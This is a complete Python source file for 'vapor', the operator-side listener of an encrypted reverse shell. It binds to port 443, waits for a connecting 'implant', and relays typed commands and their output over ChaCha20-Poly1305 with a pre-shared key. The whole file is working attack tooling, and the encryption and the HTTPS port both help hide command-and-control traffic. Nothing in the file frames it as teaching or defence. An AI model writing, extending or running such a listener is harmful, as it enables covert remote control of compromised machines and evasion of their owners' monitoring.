#!/usr/bin/env python3
"""vapor listener — ChaCha20-Poly1305 encrypted TCP reverse shell."""

import argparse
import os
import socket
import struct
import sys
import threading
import time

from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

NONCE_SIZE = 12
MAC_SIZE = 16

# ── catppuccin mocha ──
C_BLUE = "\033[38;2;137;180;250m"
C_SAPPHIRE = "\033[38;2;116;199;236m"
C_TEAL = "\033[38;2;148;226;213m"
C_GREEN = "\033[38;2;166;227;161m"
C_RED = "\033[38;2;243;139;168m"
C_MAUVE = "\033[38;2;203;166;247m"
C_PEACH = "\033[38;2;250;179;135m"
C_TEXT = "\033[38;2;205;214;244m"
C_SUBTEXT = "\033[38;2;166;173;200m"
C_OVERLAY = "\033[38;2;108;112;134m"
C_SURFACE = "\033[38;2;69;71;90m"
C_RESET = "\033[0m"
C_BOLD = "\033[1m"


def encrypt_msg(key, plaintext):
    """Encrypt -> [nonce(12)][ciphertext][mac(16)]."""
    nonce = os.urandom(NONCE_SIZE)
    ct_and_tag = ChaCha20Poly1305(key).encrypt(
        nonce, plaintext, None
    )
    return nonce + ct_and_tag


def decrypt_msg(key, data):
    """Decrypt [nonce(12)][ciphertext][mac(16)] -> plaintext."""
    nonce = data[:NONCE_SIZE]
    ct_and_tag = data[NONCE_SIZE:]
    return ChaCha20Poly1305(key).decrypt(
        nonce, ct_and_tag, None
    )


def recv_exact(sock, n):
    """Loop recv until exactly n bytes received."""
    buf = b""
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            return None
        buf += chunk
    return buf


def send_msg(sock, key, plaintext):
    """Encrypt, length-prefix, and send."""
    encrypted = encrypt_msg(key, plaintext)
    header = struct.pack("<I", len(encrypted))
    sock.sendall(header + encrypted)


def recv_msg(sock, key):
    """Recv length-prefixed encrypted message and decrypt."""
    header = recv_exact(sock, 4)
    if header is None:
        return None
    size = struct.unpack("<I", header)[0]
    if size > 65600:
        return None
    payload = recv_exact(sock, size)
    if payload is None:
        return None
    return decrypt_msg(key, payload)


def print_banner(lhost, lport, key_hex):
    """Print startup banner in Catppuccin Mocha colors."""
    print()
    print(f"  {C_BLUE}{C_BOLD}"
          f" __   ____ _ _ __   ___  _ __   {C_RESET}")
    print(f"  {C_SAPPHIRE}{C_BOLD}"
          f" \\ \\ / / _` | '_ \\ / _ \\| '__|  "
          f"{C_RESET}")
    print(f"  {C_TEAL}{C_BOLD}"
          f"  \\ V / (_| | |_) | (_) | |     "
          f"{C_RESET}")
    print(f"  {C_GREEN}{C_BOLD}"
          f"   \\_/ \\__,_| .__/ \\___/|_|     "
          f"{C_RESET}")
    print(f"  {C_GREEN}{C_BOLD}"
          f"            |_|                  "
          f"{C_RESET}")
    print()
    print(
        f"  {C_OVERLAY}chacha20-poly1305 "
        f"reverse shell{C_RESET}"
    )
    print(f"  {C_SURFACE}{'-' * 36}{C_RESET}")
    print(
        f"  {C_BLUE}[*]{C_RESET} Listening on "
        f"{C_TEXT}{lhost}:{lport}{C_RESET}"
    )
    print(
        f"  {C_BLUE}[*]{C_RESET} PSK: "
        f"{C_PEACH}{key_hex[:8]}{C_OVERLAY}..."
        f"{C_PEACH}{key_hex[-8:]}{C_RESET}"
    )
    print(f"  {C_SURFACE}{'-' * 36}{C_RESET}")
    print()


def handle_session(conn, addr, key):
    """Interactive session with connected implant."""
    print(
        f"{C_GREEN}[+]{C_RESET} Connection from "
        f"{C_TEXT}{addr[0]}:{addr[1]}{C_RESET}"
    )
    print(
        f"{C_BLUE}[*]{C_RESET} Session open. "
        f"Type commands or "
        f"{C_RED}'exit'{C_RESET} to quit.\n"
    )

    while True:
        try:
            cmd = input(f"{C_MAUVE}vapor>{C_RESET} ")
        except (EOFError, KeyboardInterrupt):
            print(f"\n{C_RED}[!]{C_RESET} Closing session.")
            break

        cmd = cmd.strip()
        if not cmd:
            continue

        try:
            send_msg(conn, key, cmd.upper().encode("utf-8")
                     if cmd.lower() == "exit"
                     else cmd.encode("utf-8"))
        except (BrokenPipeError, ConnectionError):
            print(
                f"{C_RED}[!]{C_RESET} Connection lost."
            )
            break

        if cmd.lower() == "exit":
            print(f"{C_PEACH}[*]{C_RESET} EXIT sent.")
            break

        # Show spinner while waiting for response
        stop_spinner = threading.Event()

        def spinner():
            chars = "\\|/-"
            i = 0
            start = time.time()
            while not stop_spinner.is_set():
                elapsed = time.time() - start
                print(
                    f"\r{C_PEACH}[{chars[i % 4]}]{C_RESET}"
                    f" Waiting... {elapsed:.0f}s",
                    end="", flush=True,
                )
                i += 1
                stop_spinner.wait(0.15)
            print("\r" + " " * 40 + "\r", end="", flush=True)

        t = threading.Thread(target=spinner, daemon=True)
        t.start()

        try:
            result = recv_msg(conn, key)
        except Exception:
            stop_spinner.set()
            t.join()
            print(
                f"{C_RED}[!]{C_RESET} "
                f"Decrypt failed or connection lost."
            )
            break

        stop_spinner.set()
        t.join()

        if result is None:
            print(
                f"{C_RED}[!]{C_RESET} Connection closed."
            )
            break

        output = result.decode("utf-8", errors="replace")
        print(f"{C_GREEN}[+]{C_RESET} Result:")
        print(f"{C_TEXT}{output}{C_RESET}")

    conn.close()


def hex_decode_key(hex_str):
    """Decode 64-char hex string to 32 raw bytes."""
    if len(hex_str) != 64:
        raise ValueError(
            f"PSK must be 64 hex chars (got {len(hex_str)})"
        )
    return bytes.fromhex(hex_str)


def main():
    """Entry point."""
    parser = argparse.ArgumentParser(
        description="vapor listener"
    )
    parser.add_argument(
        "--lhost", default="0.0.0.0",
        help="Listen address"
    )
    parser.add_argument(
        "--lport", type=int, default=443,
        help="Listen port"
    )
    parser.add_argument(
        "--key", required=True,
        help="64-char hex PSK (shared with implant)"
    )
    args = parser.parse_args()

    try:
        key = hex_decode_key(args.key)
    except ValueError as e:
        print(f"{C_RED}[!]{C_RESET} Invalid key: {e}")
        sys.exit(1)

    print_banner(args.lhost, args.lport, args.key)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(
        socket.SOL_SOCKET, socket.SO_REUSEADDR, 1
    )
    srv.bind((args.lhost, args.lport))
    srv.listen(1)

    print(
        f"{C_BLUE}[*]{C_RESET} Waiting for connection..."
    )

    try:
        conn, addr = srv.accept()
    except KeyboardInterrupt:
        print(f"\n{C_RED}[!]{C_RESET} Shutting down.")
        srv.close()
        sys.exit(0)

    handle_session(conn, addr, key)
    srv.close()


if __name__ == "__main__":
    main()
